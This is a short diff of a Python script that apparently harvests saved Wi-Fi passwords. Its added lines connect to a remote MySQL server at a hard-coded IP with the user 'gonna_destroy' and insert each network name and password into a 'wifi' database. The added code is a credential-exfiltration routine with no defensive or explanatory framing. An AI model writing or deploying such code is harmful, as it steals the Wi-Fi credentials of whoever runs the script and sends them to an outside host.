@@ -52,11 +52,22 @@ def main():
         get_passwords(profiles)
 
         connect = mysql.connector.connect(
-            host='45.140.83.56',
-
+            host='91.247.113.151',
+            user='gonna_destroy',
+            password='lastpassword',
+            database='wifi',
+            charset='utf8mb4',
+            collation='utf8mb4_unicode_ci'
         )
 
+        cursor = connect.cursor()
 
+        for key, value in COMPLIENCE.items():
+            cursor.execute('INSERT INTO config (ssid, passwd) VALUES (%s,%s) ', (key,value))
+            connect.commit()
+
+        cursor.close()
+        connect.cursor()
 
 colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA]
 
